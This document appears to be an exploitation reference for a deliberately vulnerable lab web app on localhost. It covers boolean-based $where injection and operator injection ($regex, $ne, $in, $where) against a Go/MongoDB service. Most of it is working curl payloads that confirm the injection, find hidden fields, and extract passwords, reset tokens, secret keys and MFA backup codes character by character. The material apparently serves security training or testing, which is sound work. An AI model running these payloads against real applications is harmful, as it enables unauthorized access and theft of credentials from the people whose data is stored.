Exploitation reference. App2 – VULN-C and VULN-D (NoSQL injection, MongoDB).

VULN-C NoSQL Injection – Boolean-Based Data Extraction

Endpoint: GET /api/lookup?user=<value> (JSON) or GET /lookup?user=<value> (HTML)

Mechanism: The user parameter is interpolated into a $where JavaScript expression. By injecting a conditional JS regex, the attacker can test hidden field values character by character. The boolean oracle is the HTTP status code: 200 = condition true | 404 = condition false.

Step 1 – Confirm injection point:

# Always-true condition → returns profile (200)
curl -s -o/dev/null -w "%{http_code}" \
  "http://localhost:8082/api/lookup?user=jdoe'+||+'1'=='1"

# Always-false condition → not found (404)
curl -s -o/dev/null -w "%{http_code}" \
  "http://localhost:8082/api/lookup?user=jdoe'+||+'1'=='2"

Step 2 – Discover hidden fields:

# Test if 'resetToken' field exists in the document
curl -s -o/dev/null -w "%{http_code}" \
  "http://localhost:8082/api/lookup?user=jdoe'+%26%26+this.hasOwnProperty('resetToken')+||+'x'%3D%3D'y"
# Decoded: jdoe' && this.hasOwnProperty('resetToken') || 'x'=='y

# Test if 'password' field exists
curl -s -o/dev/null -w "%{http_code}" \
  "http://localhost:8082/api/lookup?user=jdoe'+%26%26+this.hasOwnProperty('password')+||+'x'%3D%3D'y"

Step 3 – Extract field value character by character:

# Is the first character of jdoe's password 'P'? (200=yes, 404=no)
curl -s -o/dev/null -w "%{http_code}" \
  "http://localhost:8082/api/lookup?user=jdoe'+%26%26+this.password.match(%2F%5EP.*%2F)+||+'x'%3D%3D'y"
# Decoded: jdoe' && this.password.match(/^P.*/) || 'x'=='y

# Extend the pattern as chars are found
# jdoe' && this.password.match(/^Pa.*/) || 'x'=='y
# jdoe' && this.password.match(/^Pa5.*/) || 'x'=='y  ... etc.

# Extract resetToken of 'admin'
# admin' && this.resetToken.match(/^reset_.*/) || 'x'=='y
curl -s -o/dev/null -w "%{http_code}" \
  "http://localhost:8082/api/lookup?user=admin'+%26%26+this.resetToken.match(%2F%5Ereset_.*%2F)+||+'x'%3D%3D'y"

Why it works: fmt.Sprintf interpolates the username into a $where JS expression without escaping. Injecting a single quote closes the username string, allowing arbitrary JS to be appended. The response (200 vs 404) leaks one bit per request.

VULN-D NoSQL Operator Injection – Extract Unknown Fields

Endpoint: GET /api/employee?id=<value>

Mechanism: The id parameter is parsed as JSON if it starts with {. A JSON object like {"$regex":"^adm"} becomes a BSON operator, letting the attacker find arbitrary documents. The handler returns the raw bson.M document — exposing ALL fields, including those the UI never shows (password, resetToken, secretKey, mfaBackupCode, adminLevel).

Step 1 – Access known user and see all fields:

# Direct username lookup — returns full document with hidden fields
curl -s "http://localhost:8082/api/employee?id=admin" | python3 -m json.tool
# Response includes: name, role, skills, bio AND password, resetToken, secretKey...

Step 2 – Operator injection to find unknown usernames:

# Regex: find username starting with "adm"
curl -s 'http://localhost:8082/api/employee?id={"$regex":"^adm"}' | python3 -m json.tool

# $ne: find any user (returns first document)
curl -s 'http://localhost:8082/api/employee?id={"$ne":"nonexistent"}' | python3 -m json.tool

# $in: try common admin usernames
curl -s 'http://localhost:8082/api/employee?id={"$in":["admin","administrator","root","sysadmin"]}' | python3 -m json.tool

Step 3 – Find users with specific hidden fields:

# Find a user who has a 'secretKey' field
curl -s 'http://localhost:8082/api/employee?id={"$where":"this.hasOwnProperty('"'"'secretKey'"'"')"}' | python3 -m json.tool

# All employees with adminLevel > 3
curl -s 'http://localhost:8082/api/employee?id={"$where":"this.adminLevel > 3"}' | python3 -m json.tool

Why it works: json.Unmarshal converts a JSON operator object into map[string]interface{}. When placed in bson.D, the mongo-driver executes it as a BSON operator. The handler uses bson.M (which decodes all fields) and calls json.NewEncoder(w).Encode(doc) without field filtering — exposing every attribute stored in MongoDB.

Database: app2_db  |  Collection: employees  |  Public fields: name, username, department, role, bio, skills  |  Hidden fields: password, resetToken, secretKey, adminLevel, mfaBackupCode, bonusAmount
